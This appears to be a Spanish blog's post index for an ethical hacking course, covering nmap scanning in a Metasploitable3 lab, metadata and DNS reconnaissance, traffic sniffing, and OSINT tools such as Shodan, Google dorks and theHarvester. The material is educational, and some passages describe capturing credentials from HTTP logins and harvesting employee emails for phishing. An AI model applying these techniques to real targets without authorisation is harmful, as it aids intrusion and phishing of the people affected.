herramientas para garantizar el anonimato porque las técnicas de recopilación pasiva de información no son ilegales y no necesitas ocultar tu dirección ip pública. Son técnicas que se basan en búsqueda de información en fuentes abiertas y no van dirigidas a ningún objetivo en particular. A partir de ahora, donde empezamos a ver técnicas de recopilación activa de información, en las que se dirigen a objetivos específicos, establecemos un laboratorio virtual donde realizamos todas las pruebas sobre servidores y máquinas en nuestro entorno controlado, nunca hacia Internet. No os recomiendo bajo ningún concepto que utilicéis técnicas activas de hacking sobre objetivos que se encuentren en Internet y para los que no disponéis de un contrato previo para realización de un Hacking Ético, ni siquiera utilizando herramientas para garantizar el anonimato.Importancia del anonimatoUna vez presentada esta reflexión sobre las técnicas para garantizar el anonimato en Internet, me gustaría hablar sobre la importancia que tienen para ciertas tareas. Uno de los ejemplos más claros en los que pueden servir técnicas como una VPN es cuando estamos conectados a una red local no confiable, como puede ser la red wifi de una cafetería o de un aeropuerto. En estos casos no sabemos que dispositivos hay conectados a nuestra misma red local o si pueden estar monitorizando nuestra comunicación (como se presenta en la sección “Explotación y hacking de vulnerabilidades en Red”), por lo tanto, el uso de una VPN, que cifra el tráfico de red desde nuestro equipo a un servidor en Internet, nos garantiza que alguien interceptando nuestra comunicación no pueda ver nada.Para terminar con el artículo, me gustaría indicaros algunas de las soluciones y herramientas más populares para garantizar el anonimato en Internet: La opción más sencilla es utilizar un proxy. Si utilizas un proxy gratuito y público ten en cuenta que en esa máquina de destino por la que estas saliendo a Internet pueden estar monitorizando tu navegación. Otro de los mecanismos más comunes es utilizar una VPN. Aunque es menos popular, podéis conectaros a Internet a través de la Red Tor, esto garantiza que los nodos de salida a Internet pertenezcan a esta red y, por lo tanto, su dirección ip pública sea diferente a la tuya. En este caso también debes tener en cuenta que mucha gente utiliza este mecanismos y sus direcciones ip públicas están bloqueadas frecuentemente por los buscadores más populares como Google. Podéis establecer vuestra propia máquina de salto en la nube. Puedes crear una cuenta gratuita de AWS (Amazon Web Services) y crear una máquina (instancia) en la nube que puedes utilizar de máquina de salto para conectarte a Internet y hacer las peticiones a través de ella, sería muy similar a tener tu proxy personal.ObjetivoRecolección de información sobre un objetivo determinado utilizando métodos que interactúan de manera directa con la organización normalmente mediante el envío de tráfico de red.Alcance: Escáneres de hosts. Escáneres de puertos. Escáneres de servicios.En muchas ocasiones la actividad de este tipo de técnicas suele ser detectada como actividad sospechosa o maliciosa.Presentación del entorno vulnerable: Metasploitable3.Metasploitable3 es una máquina virtual gratuita de Windows Server 2008 y ubuntu 16.04 que cuenta con varias vulnerabilidades listas para ser explotadas y practicar nuestras técnicas de hacking o simular ataques, Metasploitable3 ha sido desarrollado por Rapid7, los mismos desarrolladores del conocido Framework MetaSploit.Es usado por gran parte de la industria de la ciberseguridad por varios motivos, cómo por ejemplo, la formación de personal para la explotación de redes, pruebas de software o demostración y viabilidad de ataques.Usar una máquina virtual para probar nuestros ataques es la manera más cómoda y rápida de conocer hasta dónde podemos llegar a explotar un sistema sin ponerlo en riesgo, además, siempre contamos con la ventaja de que si algo sale mal, volvemos a reinstalar y tenemos de nuevo un sistema vulnerable en cuestión de minutos.DNSrecon y transferencia de zona[TODO]NmapNmap (“Network Mapper”) es una herramienta de código abierto para la exploración de redes y la auditoría de seguridad. Fue diseñada para escanear rápidamente grandes redes, aunque funciona bien contra hosts individuales. Nmap utiliza paquetes para determinar qué hosts están disponibles en la red, qué servicios (nombre y versión de la aplicación) ofrecen esos hosts, qué sistemas operativos (y versiones del SO) están ejecutando, qué tipo de filtros de paquetes/firewalls están en uso, y docenas de otras características.Aunque Nmap se utiliza habitualmente para auditorías de seguridad, muchos administradores de sistemas y redes lo encuentran útil para tareas rutinarias como el inventario de la red, la gestión de los programas de actualización de servicios y la supervisión del tiempo de actividad de los hosts o servicios.En la ruta usr/share/nmap/scripts tenemos una colección de script que nos pueden ayudar a obtener información valiosa. Para llevarlo a cabo, filtrar en esa carpeta los scripts que tenemos para un determinado servicio mediante ls http*, escogemos el script y ejecutamos nmap -v &amp;lt;acción&amp;gt; -p &amp;lt;puerto&amp;gt; --script=&amp;lt;script_puerto_escogido&amp;gt; &amp;lt;ip&amp;gt;Descubrimiento de Hosts Descubrimiento de un host en particular:nmap -sn &amp;lt;ip_objetivo&amp;gt; -&amp;gt; determina si el servidor está levantado. Realizar un TCP SYNC contra los puertos 80 y 443. Si no hay nada corriendo en esos puertos dará el servidor como no levantado. Si se ejecuta con permisos de administrador sudo, será menos intrusivo pues se hará una petición ARP para ver si el servidor está activo. Descubrimiento de todos los hosts de una red:nmap -sn &amp;lt;ip_objetivo&amp;gt;/&amp;lt;mascara_red&amp;gt; -&amp;gt; determina cuantos de los hosts están levantados. De nuevo, realizar un TCP SYN contra los puertos 80 y 443. Si no hay nada corriendo en esos puertos dará el host como apagado. Si se ejecuta con permisos de administrador sudo, será menos intrusivo pues se hará una petición ARP para ver si el servidor está activo. Documentación oficial sobre host discovery. Se observa que en este apartado existen más comandos para el descubrimiento de host, pero muchos de ellos son descubrimiento de puertos, lo cual genera mucho tráfico de red para determinar si un host está o no levantado.Escaneo de puertosEsta técnica sirve para determinar el estado de los puertos.Esta técnica NO determina qué aplicación hay corriendo por detrás del puerto. Por ejemplo, si encuentra el puerto 80 abierto dirá que es HTTP, pero puede que en el servidor hayan cambiado el servicio HTTP a otro puerto.Más info aquí.Los 6 estados reconocidos por nmap: Abierto:Una aplicación acepta conexiones TCP o paquetes UDP en este puerto. El encontrar esta clase de puertos es generalmente el objetivo primario de realizar un sondeo de puertos. Las personas orientadas a la seguridad saben que cada puerto abierto es un vector de ataque. Los atacantes y las personas que realizan pruebas de intrusión intentan aprovechar puertos abiertos, por lo que los administradores intentan cerrarlos, o protegerlos con cortafuegos, pero sin que los usuarios legítimos pierdan acceso al servicio. Los puertos abiertos también son interesantes en sondeos que no están relacionados con la seguridad porque indican qué servicios están disponibles para ser utilizados en una red. Cerrado:Un puerto cerrado es accesible: recibe y responde a las sondas de Nmap, pero no tiene una aplicación escuchando en él. Pueden ser útiles para determinar si un equipo está activo en cierta dirección IP (mediante descubrimiento de sistemas, o sondeo ping), y es parte del proceso de detección de sistema operativo. Como los puertos cerrados son alcanzables, o sea, no se encuentran filtrados, puede merecer la pena analizarlos pasado un tiempo, en caso de que alguno se abra. Los administradores pueden querer considerar bloquear estos puertos con un cortafuegos. Si se bloquean aparecerían filtrados, como se discute a continuación. Filtrado:Nmap no puede determinar si el puerto se encuentra abierto porque un filtrado de paquetes previene que sus sondas alcancen el puerto. El filtrado puede provenir de un dispositivo de cortafuegos dedicado, de las reglas de un enrutador, o por una aplicación de cortafuegos instalada en el propio equipo. Estos puertos suelen frustrar a los atacantes, porque proporcionan muy poca información. A veces responden con mensajes de error ICMP del tipo 3, código 13 (destino inalcanzable: comunicación prohibida por administradores), pero los filtros que sencillamente descartan las sondas sin responder son mucho más comunes. Esto fuerza a Nmap a reintentar varias veces, considerando que la sonda pueda haberse descartado por congestión en la red en vez de haberse filtrado. Esto ralentiza drásticamente los sondeos. No filtrado:Este estado indica que el puerto es accesible, pero que Nmap no puede determinar si se encuentra abierto o cerrado. Solamente el sondeo ACK, utilizado para determinar las reglas de un cortafuegos, clasifica a los puertos según este estado. El analizar puertos no filtrados con otros tipos de análisis, como el sondeo Window, SYN o FIN, pueden ayudar a determinar si el puerto se encuentra abierto. abierto|filtrado:Nmap marca a los puertos en este estado cuando no puede determinar si el puerto se encuentra abierto o filtrado. Esto ocurre para tipos de análisis donde no responden los puertos abiertos. La ausencia de respuesta puede también significar que un filtro de paquetes ha descartado la sonda, o que se elimina cualquier respuesta asociada. De esta forma, Nmap no puede saber con certeza si el puerto se encuentra abierto o filtrado. Los sondeos UDP, protocolo IP, FIN, Null y Xmas clasifican a los puertos de esta manera. cerrado|filtrado:Este estado se utiliza cuando Nmap no puede determinar si un puerto se encuentra cerrado o filtrado, y puede aparecer aparecer sólo durante un sondeo IP ID pasivo. Opciones -sS (TCP SYN scan) -&amp;gt; nmap -sS &amp;lt;ip&amp;gt; Esta técnica se denomina a menudo escaneo semiabierto, porque no se abre una conexión TCP completa (no realiza el Three-way Handshake). Envías un paquete SYN, como si fueras a abrir una conexión real y luego esperas una respuesta. a) Un SYN/ACK indica que el puerto está escuchando (abierto), b) mientras que un RST (reinicio) es indicativo de que no está escuchando. Si no se recibe respuesta tras varias retransmisiones, el puerto se marca como filtrado. -sT (TCP connect scan) -&amp;gt; nmap -sT &amp;lt;ip&amp;gt; La técnica anterior, al no realizar la conexión TCP completa (Three-way Handshake) puede levantar sospechas en el IDS. Para evitar que salten las alarmas lo realizamos con -sT, que lanza una conexión TCP completa (en un buen IDS también saltarán al realizarlo con -sT). -oX -&amp;gt; Exportar los resultados a una hoja xml para ver con más claridad los resultados. Por ejemplo: nmap -sS &amp;lt;ip&amp;gt; -oX &amp;lt;archivo_destino&amp;gt;.xml --stylesheet=&quot;https://svn.nmap.org/nmap/docs/namp.xsl&quot; Más info aquí. Nmap xmlDescubrimiento de serviciosVamos a ir un paso más allá y vamos a ver qué servicio se encuentra corriendo detrás de un puerto abierto. -sV (Version detection) -&amp;gt; nmap -sV &amp;lt;ip&amp;gt;. Nos devuelve los puertos que estén abiertos y la aplicación que está corriendo. Además, tambien nos informa del SO de la maquina. Con toda esta información, podremos buscar si existe algún exploit que comprometa la seguridad de las aplicaciones o del SO.Nmap descubrimiento de serviciosIdentificación del sistema operativo -O (Enable OS detection) -&amp;gt; nmap -O &amp;lt;ip&amp;gt;. Más info aquí" }, { "title": "Recopilación Semi-Pasiva de información", "url": "/posts/seg-ofensiva-reco-semipasiva/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, FOCA, DNSdumpster, Sniffers, Wireshark, TCPdump", "date": "2021-06-10 12:03:00 +0200", "snippet": "En esta sección se han recopilado algunas de las principales herramientas usadas durante la fase de recopilación semi-pasiva de información.Contenido Objetivo FOCA ¿Qué son los metadatos? ¿Cómo funciona? Caso de uso DNSdumpster Tipos de registro DNS más importantes Caso de uso Sniffers Wireshark Caso de uso TCPdump ObjetivoEn la fase anterior hemos visto en qué consistía la fase de recopilación de información pasiva.En muchas ocasiones no se hace distinción entre la fase de recopilación pasiva y semi-pasiva. Sin embargo, nosotros hacemos distinción entre ambas, porque como se dijo en la fase anterior, mediante la recopilación pasiva no se genera tráfico contra el objetivo, es decir, no existía ningún tipo de interacción el objetivo, por eso extraíamos la información de fuente públicas.En esta fase, empezamos a generar tráfico contra el objetivo de manera que nuestro no se dé cuenta de que ese tráfico de red viene como consecuencia de que estamos haciendo una recopilación de información.Como resumen: Recolección de información sobre un objetivo utilizando métodos que se asimilen al tráfico de red y comportamiento real que suele recibir. Se encuentran actividades como: Consultas a servidores DNS. Accesos a recursos internos de las aplicaciones web. Análisis a metadatos de documentos. Quedan fuera del alcance actividades que generen comportamiento anómalo.FOCASu objetivo es la obtención de información relevante (metadatos) de nuestros objetivos a través de documentos de su propiedad que se puedan encontrar de forma libre en internet. Solo para windows.¿Qué son los metadatos?Los metadatos, literalmente «sobre datos», son datos que describen otros datos.Por ejemplo, cuando se crea un documento PDF se le asocian una serie de metadatos como la fecha de creación, nombre del equipo donde se generó el archivo, el SO, etc.¿Cómo funciona?Realiza una búsqueda de estos ficheros en determinados buscadores, para posteriormente analizar toda la información que se pueda extraer de los metadatos que haya en los mismos y de la urls donde se hayan descargado.Caso de usoPodemos obtener nombres de equipos, SO usado y con ello usar vulnerabilidades que tenga, emails, etc.En esta imagen se puede observar los nombres de equipos o usuarios que han creado ciertos archivosFOCADNSdumpsterNos permite realizar un análisis de la red y de todo el dominio que estamos analizando. Esto nos ayudará a conocer mejor por dónde nos estamos moviendo, así como descubrir posibles rutas y subdominios, así como los distintos hosts que forman la red.Es una herramienta opensource (alojada en https://dnsdumpster.com/) diseñada para facilitarnos el análisis de cualquier dominio y poder obtener en segundos todo tipo de información relacionada con este. No utiliza la fuerza bruta como pueden usar otras similares, sino que recurre a la Open Source Intelligence (OSINT) para encontrar de manera silenciosa toda la información relacionada con el dominio que nos interese analizar.Tipos de registro DNS más importantes Siglas Nombre Descripción A Registro de dirección Devuelve una dirección IP. Este registro sirve para resolver nombres de alojamientos a un número IPv4, teniendo en cuenta si la IP es dinámica o fija. Por ejemplo, para apuntar nuestro nombre de dominio a un servidor. AAAA Registro de dirección IPv6 Los registros AAAA son muy parecidos a los A, es decir, ambos devuelven una dirección IP. En el caso de los AAAA, las IPs que se almacenan son IPv6. Este tipo de registro de DNS, al igual que A, sirve para apuntar nuestro dominio a un determinado servidor. CAA Autorización de la Autoridad de Certificación Este parámetro de DNS es un mecanismo de seguridad que permite limitar las autoridades certificadoras válidas para un dominio. Es decir, indicar a qué autoridades certificadoras permitimos emitir certificados de seguridad (SSL) para el dominio. CNAME Registro de nombre canónico Este registro se suele utilizar para crear alias de un nombre. CNAME es una forma de hacer que el dominio apunte a otro dominio diferente o a un subdominio. También puede usarse cuando distintos servicios están utilizando una misma IP, de forma que cada servicio tenga su propia entrada DNS. MX Registro de intercambio del correo Los registros MX apuntar al servidor de correo del dominio y es posible establecer tantos como sean necesarios. En relación con estos registros ten en cuenta que, de forma automática, se establecen prioridades. Es decir, el primer registro MX que introduzcas tendrá prioridad sobre los siguientes. PTR Registro de puntero O registro inverso, ya que funciona de manera opuesta a A, se encarga de traducir IPs a nombres de dominio. Generalmente PTR se utiliza en el archivo de configuración de la zona DNS inversa. SRV Localizador de servicios Es un registro para servicios especiales que proporciona información relacionada con los servicios disponibles para un determinado dominio. Es habitual su uso con XMPP, LDAP o SIP. TXT Registro de texto Registro para insertar el texto que desees. Suele utilizarse para verificar la autoridad del dominio o para evitar usos incorrectos de las direcciones de correo. Además, TXT permite la creación de registros especiales y Domain-Keys. Caso de usoIntroducimos el dominio que vamos a analizar, por ejemplo, tesla.com. Automáticamente esta plataforma empezará a analizar todo lo relacionado con este dominio. Cuando finalice el análisis del mismo podremos ver ya toda la información relacionada con él (además de los subdominios, nos devolverá información del servidor DNS, registros MX, registros TXT y un interesante esquema de las relaciones del dominio analizado.)En esta imagen se puede observar los nombres de equipos o usuarios que han creado ciertos archivosInformación extraídaDNSdumpster grafo de relacionesSniffersPuede entenderse como un programa con la capacidad de observar el flujo de datos en tránsito por una red, y obtener información de éste; está diseñado para analizar los paquetes de datos que pasan por la red y no están destinados para él, lo que bajo ciertas circunstancias es muy útil, y bajo otras, a la vez, muy peligroso.WiresharkEs un potente sniffer de red basado en pcap. Desarrollado como software libre y se encuentra disponible para multitud de SO.Es el captador pasivo de tráfico de red más utilizado en la actualidad, permitiendo interceptar paquetes de información tanto en redes cableadas como Wireless.Caso de usoEl primer paso que tenemos que dar para realizar una captura pasiva de tráfico es habilitar el modo promiscuo en la interfaz de red que vamos a utilizar. (en entorno linux ifconfig &amp;lt;nombre_interfaz&amp;gt; promisc).Vamos a realizar una prueba para comprobar el peligro que corren aquello usuarios que inician sesión en una página web que no utiliza protocolos seguros. Para ello, buscamos una web que esté desarrollada bajo el protocolo HTTP. Realizamos el inicio de sesión y podremos observar el paquete en wireshark con las credenciales que ha usado el usuario.WiresharkTCPdumpSi no podemos acceder una interfaz gráfica y únicamente tenemos acceso a una interfaz de comandos (shell) la única forma que tenemos de realizar el análisis de la red es por medio de este programa.Como se hace más difícil la lectura de los paquetes en la shell, podemos guardar mediante el comando tcpdump -i &amp;lt;nombre_interfaz&amp;gt; -w &amp;lt;nombre_fichero_salida&amp;gt;.pcap el análisis realizado. Ese archivo generado podemos importarlo a wireshark para su interpretación." }, { "title": "Recopilación Pasiva de información", "url": "/posts/seg-ofensiva-reco-pasiva/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, Google Hacking, Shodan, WHOIS, Archive.org, The Harverster, Maltego, Recon-ng", "date": "2021-05-25 12:03:00 +0200", "snippet": "En esta sección se han recopilado algunas de las principales herramientas usadas durante la fase de recopilación pasiva de información.Índice Objetivo Hacking con buscadores: Google Hacking Comandos principales Google Hacking Operadores Booleanos Google Hacking Google Hacking Database Shodan ¿Cómo funciona? Comandos principales WHOIS Archive.org Caso de uso The Harvester Caso de uso Comandos más importantes Maltego ¿Qué es un transformador? ¿Qué es un grafo? Caso de uso Recon-ng Caso de uso ObjetivoObtener toda la información posible sobre nuestro objetivo sin que las actividades realizadas por el analista sean mínimamente detectadas por dicho objetivo.Difícil de realizar y a menudo proporciona resultados poco concluyentes.La manera habitual de recolección pasiva de información es mediante el acceso a la información almacenada en lugares públicos.Raramente se utiliza de manera individual, normalmente se combina con recopilación semi-pasiva y activa. De esta manera podremos contrastar la información hallada.Hacking con buscadores: Google HackingRecopilaremos aquella información que haya sido indexada por el buscador.Comandos principales Google HackingA continuación se muestran los comandos principales que podemos utilizar con Google. Hay que tener en cuenta que todos ellos deben ir seguidos (sin espacios) de la consulta que quiere realizarse: Comando Descripción define:término Se muestran definiciones procedentes de páginas web para el término buscado. filetype:término Las búsquedas se restringen a páginas cuyos nombres acaben en el término especificado. Sobretodo se utiliza para determinar la extensión de los ficheros requeridos. Nota: el comando ext:término se usa de manera equivalente. site:sitio/dominio Los resultados se restringen a los contenidos en el sitio o dominio especificado. Muy útil para realizar búsquedas en sitios que no tienen buscadores internos propios. link:url Muestra páginas que apuntan a la definida por dicha url. La cantidad (y calidad) de los enlaces a una página determina su relevancia para los buscadores. Nota: sólo presenta aquellas páginas con pagerank 5 o más. cache:url Se mostrará la versión de la página definida por url que Google tiene en su memoria, es decir, la copia que hizo el robot de Google la última vez que pasó por dicha página. info:url Google presentará información sobre la página web que corresponde con la url. related:url Google mostrará páginas similares a la que especifica la url. Nota: Es difícil entender que tipo de relación tiene en cuenta Google para mostrar dichas páginas. Muchas veces carece de utilidad. allinanchor:términos Google restringe las búsquedas a aquellas páginas apuntadas por enlaces donde el texto contiene los términos buscados. inanchor:término Las búsquedas se restringen a aquellas apuntadas por enlaces donde el texto contiene el término especificado. A diferencia de allinanchor se puede combinar con la búsqueda habitual. allintext:términos Se restringen las búsquedas a los resultados que contienen los términos en el texto de la página. intext:término Restringe los resultados a aquellos textos que contienen término en el texto. A diferencia de allintext se puede combinar con la búsqueda habitual de términos. allinurl:términos Sólo se presentan los resultados que contienen los términos buscados en la url. inurl:término Los resultados se restringen a aquellos que contienen término en la url. A diferencia de allinurl se puede combinar con la búsqueda habitual de términos. allintitle:términos Restringe los resultados a aquellos que contienen los términos en el título. intitle:término Restringe los resultados a aquellos documentos que contienen término en el título. A diferencia de allintitle se puede combinar con la búsqueda habitual de términos. Operadores Booleanos Google HackingGoogle hace uso de los operadores booleanos para realizar búsquedas combinadas de varios términos. Esos operadores son una serie de símbolos que Google reconoce y modifican la búsqueda realizada: Operador Descripción &quot; &quot; Busca las palabras exactas. - Excluye una palabra de la búsqueda. (Ej: gmail -hotmail, busca páginas en las que aparezca la palabra gmail y no aparezca la palabra hotmail). OR ó \\| Busca páginas que contengan un término u otro. + Permite incluir palabras que Google por defecto no tiene en cuenta al ser muy comunes (en español: “de”, “el”, “la”…..). También se usa para que Google distinga acentos, diéresis y la letra ñ, que normalmente son elementos que no distingue. * Comodín. Utilizado para sustituir una palabra. Suele combinarse con el operador de literalidad (“ “). Google Hacking DatabaseEs un repositorio donde se publican los denominados Google Dork. Cada una de las consultas que tenemos en el apartado anterior se denominan Google Dork.Hay que dejar claro que los Google Dorks van dejando de tener utilidad a medida que las empresas van descubriendo la información expuesta e indexada.ShodanEs un motor de búsqueda que le permite al usuario encontrar información de equipos (routers, servidores, etc.) conectados a Internet a través de una variedad de filtros.En lugar de indexar webs (como hace google), indexa los sistemas en base a los servicios que están corriendo en esos sistemas (concretamente al banner que nos proporcionan esos servicios).¿Cómo funciona?Solicita conexiones a todas las direcciones IP imaginables en Internet e indexando la información que obtiene de esas solicitudes de conexión. Rastrea la web en busca de dispositivos utilizando una red global de ordenadores y servidores que funcionan las 24 horas del día.Realiza un escaneo de puertos. Aquellos que estén abiertos responden con banners que contienen importantes metadatos sobre los dispositivos a los que Shodan solicita una conexión.Estos banners pueden proporcionar todo tipo de información de identificación, pero aquí están algunos de los campos más comunes que verá en un banner: Nombre del dispositivo: Cómo se llama el dispositivo en línea. Dirección IP. Número de puerto: El protocolo que utiliza su dispositivo para conectarse a la web. Organización: Qué empresa es la propietaria de tu “espacio IP”. Ubicación. Algunos dispositivos incluso incluyen su nombre de usuario y contraseña por defecto, la marca y el modelo, y la versión del software, todo lo cual puede ser aprovechado por los hackers.También disponemos de la herramienta SHODAN Diggity, que permite realizar búsquedas automatizadas dentro de SHODAN, al cual se conecta a través de SHODAN API. Incorpora un repositorio de búsquedas habituales, denominado SHODAN Hacking Database.Comandos principales Operador Descripción after Only show results after the given date (dd/mm/yyyy) string asn Autonomous system number string before Only show results before the given date (dd/mm/yyyy) string category Available categories: ics, malwarestring city Name of the city string country 2-letter country code string geo Accepts between 2 and 4 parameters. If 2 parameters: latitude, longitude. If 3 parameters: latitude, longitude, range. If 4 parameters: top left latitude, top left longitude, bottom right latitude, bottom right longitude. hash Hash of the data property integer has_ipv6 True/False boolean has_screenshot True/False boolean server Devices or servers that contain a specific server header flag string hostname Full host name for the device string ip Alias for net filter string isp ISP managing the netblock string net Network range in CIDR notation (ex.199.4.1.0/24) string org Organization assigned the netblock string os Operating system string port Port number for the service integer postal Postal code (US-only) string product Name of the software/product providing the banner string region Name of the region/state string state Alias for region string version Version for the product string vuln CVE ID for a vulnerability string Repositorio con queries shodan bastante interesantes.WHOISWHOIS no es una aplicación como tal a la que vayamos a recurrir para obtener información sobre nuestro objetivo, sino que se trata de un protocolo TCP cuya misión es realizar búsquedas de información de dominios web, dentro de las bases de dataos de los organismos encargados de llevar a cabo el control sobre ellos.Mediante este procedimiento podremos obtener datos tales como la persona que realizó la compra del dominio, la fecha en la que lo hizo, la fecha en la que expira la validez de la compra, los servidores DNS sobre los que está alojado, sus direcciones IP, incluso otros datos más personales como el número de teléfono y la dirección de correo electrónico de los administradores del sitio web.Archive.orgEs una biblioteca digital gestionada por una organización sin ánimo de lucro dedicada a la preservación de archivos, capturas de sitios públicos de la Web, recursos multimedia y también software.Caso de usoEl uso que se le puede dar es: recuperar información relevante que se haya modificado o eliminado del sitio web.Por ejemplo, alguien sube a su repositorio de GitHub un proyecto y por error no elimina las credenciales. Cuando se dé cuenta, las elimina del proyecto, pero puede que estas hayan quedado capturadas en Archive.org.The HarvesterHerramienta muy simple de usar, pero poderosa y efectiva, diseñada para ser usada en las primeras fases del pentesting. Es usado para recopilar información de fuentes abiertas (OSINT). Link a su repositorio.La herramienta recopila correos electrónicos, nombres, subdominios, IPs y URLs utilizando múltiples fuentes de datos públicos como: google, baidu, linkedin, censys, shodan, github, etc.Caso de usoPor ejemplo, si queremos lanzar un ataque de phising sobre los empleados de una cierta empresa, podemos hacer que recopile los correos electrónicos de sus trabajadores a través de una consulta por linkedin.Campaña OSINT con The HarvesterEsta salida es la genérica, es decir, por terminal. Pero el parámetro -f permite exportar este resultado a un informe en HTML o XML.Comandos más importantes Parámetro Descripción -d Especifica el dominio sobre el que se va a realizar la búsqueda. -b Especifica la fuente de datos desde donde se van a obtener los resultados. Permite realizar consultas sobre motores de búsqueda, servidores PGP, redes sociales, etc. incluso sobre todas a la vez. -g Realiza la búsqueda dentro de los dorks de Google, en lugar de sobre el buscador normal. -f Permite exportar los resultados de la búsqueda a un informe en formato HTML o XML. Opción muy interesante para ganar en claridad. -l Limita el número de resultados a mostrar. -h Realiza la consulta sobre el motor de búsqueda SHODAN. MaltegoEs una herramienta de inteligencia de código abierto (OSINT) y de análisis de enlaces gráficos para recopilar y conectar información para tareas de investigación.¿Qué es un transformador?Sirven para la recopilación OSINT de fuentes comunes en Internet, incluidas las consultas en servidores DNS, motores de búsqueda, redes sociales, diversas API y otras fuentes.¿Qué es un grafo?Es la estructura principal que tiene Maltego. Es un lienzo en blanco en el que nosotros podemos arrastrar entidades. Estas entidades representan distintos tipos de información sobre los que nosotros vamos a poder buscar en fuentes públicas aplicando transformadores (es decir, consultas).Caso de usoImaginemos que con las herramientas anteriores hemos conseguido el nombre y apellidos de un trabajador de una organización que estamos investigando.Cogemos la entidad &quot;persona&quot; y la arrastramos al lienzo en blanco. Modificamos los atributos de la persona. Aplicamos los transformadores que queramos. Se irá generando un árbol con la información que va recopilando de cada transformador.Maltego grafoRecon-ngPermite realizar recolección de información y reconocimiento de redes de forma automatizada.Basa su funcionamiento en el uso de diferentes módulos que ya vienen incluidos en la herramienta. Debiendo instalar aquellos que queramos usar por medio del marketplace. &amp;gt; marketplace install nombre_module.Mediante el comando &amp;gt; show modules accedemos al listado de los módulos instalados. Están divididos en 5 tipos (Discovery, Explotation, Import, Recon y Reporting).Caso de usoEn primer lugar, debemos escoger qué modulo queremos usar. Para ello ejecutamos el comando &amp;gt; use nombre_module.A continuación, para saber qué opciones tiene el módulo, usamos el comando &amp;gt; show options. Especificamos los valores que requiera el módulo.Tras esto, lanzamos la ejecución del módulo mediante el comando &amp;gt; run.Una vez finalizada la ejecución, podremos ver los resultados obtenidos. La herramienta permite la exportación de los resultados a un fichero HTML." }, { "title": "Introducción al Hacking Ético y Penetration Testing", "url": "/posts/seg-ofensiva-introduccion/", "categories": "Ciberseguridad, Seguridad Ofensiva", "tags": "Pentesting, OSSTMM", "date": "2021-05-24 06:37:00 +0200", "snippet": "La protección de los sistemas requiere una comprensión amplia de las estrategias de ataque y un conocimiento profundo de las tácticas, herramientas y motivaciones del ciberdelincuente.En este curso recopilaremos las principales herramientas y técnicas aplicadas en cada uno de las fases del pentesting.Índice y Estructura Principal Introducción Metodologías Metodologías principales Metodología a seguir en el curso Definición del alcance del hacking éticoIntroducciónA la hora de llevar a cabo una actividad de hacking ético es importante el uso de metodologías previamente definidas para aumentar las probabiliades de éxito. Por ello, es importante conocer qué es una metodología, por qué es relevante que las apliquemos a nuestra forma de trabajo y también cuáles son algunas de las más relevantes.MetodologíasLas metodologías nos facilitan la realización de un conjunto de actividades en un orden determinado y estableciendo una prioridad adecuada para intentar garantizar el éxito y alcanzar un objetivo final.La salida de una fase se va a corresponder con la entrada de la siguiente fase.Metodologías principales OSSTMM (Open-Source Security Testing Methodology Manual): la más utilizada. The Penetration Testing Execution Standard: quizás algo anticuada. ISSAF (Information System Security Assement Framework) OTP (OWASP Testing Project)Metodología a seguir en el cursoComo no se está trabajando sobre un entorno real no es necesario aplicar todas las fases. En nuestro caso, vamos a saltarnos el primer y último punto. Definición del alcance del test de penetración. Recopilación de información. (Pasiva, semi-pasiva y activa) Identificación y análisis de vulnerabilidades. Explotación de las vulnerabilidades. (En host, en app. web y en redes) Post-explotación. Elaboración de un documento de reporte.Definición del alcance del hacking éticoSi se realizase la definición del alcance (nosotros no la vamos a realizar) habría que tener en consideración los siguientes aspectos: Antes de realizar ninguna acción, discutir con el cliente las tareas que llevará a cabo el analista, así como los roles y la responsabilidad de ambos. Asegurar mediante contrato firmado que las acciones que se llevan a cabo son en representación del cliente. Análisis de las políticas de la organización que definen el uso que los usuarios hacen de los sistemas y de la infraestructura. Procedimiento en caso de localizar una intrusión de un tercero.Lista de todos los apartados que componen el curso: Introducción al Hacking Ético y Penetration Testing Recopilación Pasiva de información Recopilación Semi-Pasiva de información Recopilación Activa de información Análisis de vulnerabilidades Explotación de vulnerabilidades en Hosts Explotación de vulnerabilidades en Web Explotación de vulnerabilidades en Red " }, { "title": "TFG - Sistema de control y administración de una red de garajes inteligentes y automatizados", "url": "/posts/TFG/", "categories": "Projects, Degree's Thesis", "tags": "TFG, OpenCV, Automatización, IA, Web", "date": "2019-06-08 06:37:00 +0200", "snippet": "En este post presento el Trabajo de Fin de Grado realizado para dar por concluidos mis estudios en Ingeniería Informática. El proyecto está compuesto por dos sistemas, el sistema de reconocimiento automático de matrículas y una aplicación web para la gestión. El código se puede encontrar en el siguiente repositorio de GitHub. He creado una lista de reproducción en Youtube donde recojo alguno de los vídeos usados para ilustrar el funcionamiento del proyecto.Índice y Estructura Principal Resumen Objetivos Diseño Arquitectura del sistema Arquitectura del sistema de reconocimiento de matrículas Arquitectura de la aplicación web Resultados (videos) Sistema reconocimiento de matrículas. Aplicación web. Integración. Resultados (PDF)ResumenEn este Trabajo Fin de Grado se va a desarrollar un sistema encargado del control y administración de una red de garajes inteligentes y automatizados. Para ello, el sistema estará conformadopor dos subsistemas. Estos subsistemas son considerados independientes y deben funcionar de maneraauto suficiente, compartiendo exclusivamente la información necesaria para dotar al sistema delobjetivo inicial.El primero de ellos consiste en el reconocimiento automático de matrículas. Es un método quederiva del campo de la visión artificial y está basado en la adquisición, procesamiento y análisis de lasimágenes extraídas del mundo real para lograr su interpretación y comprensión. Para su desarrollo seha hecho uso de un software opensource denominado OpenCV1. El cual no solo proporciona métodospara el procesamiento y análisis de imágenes sino que también incorpora métodos para reconocimientode objetos, entre otros. Con todo ello, se desarrolla un software en Python que comprende todaslas fases necesarias para la obtención de la matrícula de un vehículo a partir de su imagen frontal otrasera.El segundo subsistema consiste en el desarrollo de una aplicación web. Esta tiene como propósitoservir como red social donde los usuarios puedan gestionar tanto sus garajes como las plazasde los mismos. Existen dos tipos de roles: usuario administrador y usuario personal. Cada uno de ellosdispone de una interfaz exclusiva que les permite la realización de acciones específicas en función desu rol. Por ejemplo, los usuarios personales podrán poner en alquiler sus plazas de garaje, mientrasque los usuarios administradores tienen un histórico de los vehículos que han pasado por el garaje.Su desarrollo está basado en el uso del framework Vue2, el cual permite la creación de aplicacionesweb basadas en la arquitectura SPA3 (Single Page Application). Por otro lado, se integran algunos delos servicios que aporta la plataforma para el desarrollo de aplicaciones denominada Firebase4.La integración de estos dos subsistemas permite la obtención de un sistema capaz de controlarlos accesos a los garajes, basado en la extracción de las matrículas por medio del 